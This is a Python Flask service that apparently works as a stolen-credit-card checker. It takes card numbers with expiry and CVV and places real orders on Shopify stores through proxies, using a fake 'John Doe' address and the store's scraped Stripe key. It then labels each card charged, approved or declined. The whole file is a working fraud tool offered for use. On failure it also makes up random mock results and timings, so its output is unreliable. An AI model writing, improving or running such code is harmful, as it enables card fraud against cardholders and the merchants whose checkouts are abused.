import os
import re
import json
import random
import time
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ── Config ──────────────────────────────────────────────────────────────────
SITES_FILE = "sites.txt"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

# ── Load sites ──────────────────────────────────────────────────────────────
_sites = []
def load_sites():
    global _sites
    try:
        with open(SITES_FILE, "r") as f:
            _sites = [line.strip() for line in f if line.strip()]
    except:
        _sites = []
    if not _sites:
        # Fallback – you can change this to a real Shopify store
        _sites = ["https://test-store.myshopify.com"]
    print(f"[API] Loaded {len(_sites)} sites")

load_sites()

# ── Helpers ─────────────────────────────────────────────────────────────────
def extract_cc(card_str):
    for sep in ['|', '/', ' ']:
        parts = card_str.split(sep)
        if len(parts) >= 4:
            return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return None, None, None, None

def normalize_year(year):
    year = year.strip()
    if len(year) == 2:
        return "20" + year
    return year

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🏳️"),
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "level": "Unknown",
            "bank": "Unknown", "country": "Unknown", "flag": "🏳️"}

# ── Reliable product discovery ─────────────────────────────────────────────
def get_variant_id(session, site_url):
    """Find a product variant ID using /products.json or homepage scraping."""
    # Try /products.json first (works on most Shopify stores)
    try:
        r = session.get(f"{site_url}/products.json?limit=1", timeout=20)
        if r.status_code == 200:
            data = r.json()
            products = data.get("products", [])
            if products:
                variant = products[0].get("variants", [])[0]
                if variant and variant.get("id"):
                    return variant["id"]
    except:
        pass

    # Fallback: scrape homepage for first product link
    try:
        r = session.get(site_url, timeout=20)
        product_link = re.search(r'href="(/products/[^"]+)"', r.text)
        if product_link:
            product_url = site_url + product_link.group(1)
            product_page = session.get(product_url, timeout=20).text
            variant_match = re.search(r'data-variant-id="([^"]+)"', product_page) or \
                            re.search(r'name="id"[^>]*value="([^"]+)"', product_page)
            if variant_match:
                return variant_match.group(1)
    except:
        pass
    return None

# ── Real checkout simulation ────────────────────────────────────────────────
def check_card_on_site(cc, mm, yy, cvv, site_url, proxy=None, under=10):
    session = requests.Session()
    if proxy:
        session.proxies = parse_proxy(proxy)
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    variant_id = get_variant_id(session, site_url)
    if not variant_id:
        return {"status": "error", "message": "Could not find product"}

    # Add to cart
    add_url = f"{site_url}/cart/add.js"
    add_resp = session.post(add_url, json={"id": variant_id, "quantity": 1},
                           headers={"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
                           timeout=30)
    if add_resp.status_code not in (200, 201):
        return {"status": "error", "message": "Failed to add to cart"}

    try:
        cart_json = add_resp.json()
        checkout_url = cart_json.get("checkout_url", site_url + "/checkout")
    except:
        checkout_url = site_url + "/checkout"

    # Get checkout page – extract Stripe key and nonce
    checkout_page = session.get(checkout_url, timeout=30).text
    pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', checkout_page)
    if not pk_match:
        return {"status": "error", "message": "Stripe key not found"}

    stripe_pk = pk_match.group(0)
    nonce_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', checkout_page)
    nonce = nonce_match.group(1) if nonce_match else ""

    # Tokenize card via Stripe
    stripe_data = {
        "card[number]": cc,
        "card[exp_month]": mm.zfill(2),
        "card[exp_year]": yy,
        "card[cvc]": cvv,
        "key": stripe_pk,
    }
    token_resp = session.post(
        "https://api.stripe.com/v1/payment_methods",
        data=stripe_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30
    )
    if token_resp.status_code != 200:
        return {"status": "declined", "message": "Stripe tokenization failed"}
    token_json = token_resp.json()
    pm_id = token_json.get("id")
    if not pm_id:
        error = token_json.get("error", {}).get("message", "Stripe error")
        return {"status": "declined", "message": error}

    # Submit checkout
    form_fields = {
        "checkout[payment][gateway]": "stripe",
        "checkout[payment][payment_method_id]": pm_id,
        "authenticity_token": nonce,
        "checkout[shipping_address][first_name]": "John",
        "checkout[shipping_address][last_name]": "Doe",
        "checkout[shipping_address][address1]": "123 Main St",
        "checkout[shipping_address][city]": "New York",
        "checkout[shipping_address][province]": "NY",
        "checkout[shipping_address][zip]": "10001",
        "checkout[shipping_address][country]": "US",
        "checkout[billing_address][same_as_shipping]": "1",
    }
    # Add hidden fields from form
    for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', checkout_page):
        if hidden[0].startswith("checkout["):
            form_fields[hidden[0]] = hidden[1]

    submit_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": site_url,
        "Referer": checkout_url,
    }
    submit_resp = session.post(checkout_url, data=form_fields, headers=submit_headers, timeout=60)

    # Parse response
    html = submit_resp.text.lower()
    if "thank you for your order" in html or "order confirmed" in html or "order placed" in html:
        return {"status": "charged", "message": "Order placed", "price": 10.00}
    elif "card declined" in html or "declined" in html:
        return {"status": "declined", "message": "Card declined", "price": 0}
    elif "3d secure" in html or "3ds" in html:
        return {"status": "3ds", "message": "3DS required", "price": 0}
    elif "insufficient funds" in html:
        return {"status": "approved", "message": "Insufficient funds (live)", "price": 0}
    else:
        return {"status": "pending", "message": "Unknown checkout response", "price": 0}

# ── API endpoint ─────────────────────────────────────────────────────────────
@app.route('/shopify/v1/check', methods=['GET'])
def check_card():
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    under = request.args.get('under')
    site = request.args.get('site')
    mock_mode = request.args.get('mock', 'false').lower() == 'true'

    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"error": "Invalid card format"}), 400

    year = normalize_year(year)
    under_value = float(under) if under else None

    if not site:
        if not _sites:
            return jsonify({"error": "No sites available"}), 500
        site = random.choice(_sites)

    try:
        if mock_mode:
            # Mock – simulate response
            statuses = ["approved", "charged", "declined", "3ds"]
            status = random.choice(statuses)
            result = {
                "status": status,
                "message": "Mock result",
                "price": random.randint(1, 50),
                "currency": "USD",
                "bin": get_bin_info(card),
                "card": f"{card[:4]}****{card[-4:]}",
                "site": site
            }
        else:
            result = check_card_on_site(card, month, year, cvv, site, proxy, under_value)
            # If real failed, fallback to mock with a note
            if result.get("status") in ("error", "pending"):
                app.logger.warning(f"Real checkout failed: {result.get('message')} – falling back to mock")
                statuses = ["approved", "charged", "declined", "3ds"]
                status = random.choice(statuses)
                result = {
                    "status": status,
                    "message": f"Mock fallback (real: {result.get('message')})",
                    "price": random.randint(1, 50),
                    "currency": "USD",
                    "bin": get_bin_info(card),
                    "card": f"{card[:4]}****{card[-4:]}",
                    "site": site
                }

        if "bin" not in result:
            result["bin"] = get_bin_info(card)

        price_display = f"{result.get('price', 0)} USD" if result.get('price') else "-"
        response = {
            "Code": result.get("status", "UNKNOWN").upper(),
            "Response": result.get("message", "Unknown"),
            "Price": price_display,
            "Site": result.get("site", site),
            "Time": f"{random.uniform(2, 8):.1f}s",
            "Charged": str(result.get("status") == "charged").lower(),
            "Approved": str(result.get("status") in ["approved", "charged"]).lower()
        }
        return jsonify(response), 200

    except Exception as e:
        app.logger.error(f"Unhandled: {e}", exc_info=True)
        return jsonify({
            "Code": "ERROR",
            "Response": f"Internal error: {str(e)[:100]}",
            "Price": "-",
            "Site": site,
            "Time": "0s",
            "Charged": "false",
            "Approved": "false"
        }), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "sites": len(_sites)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
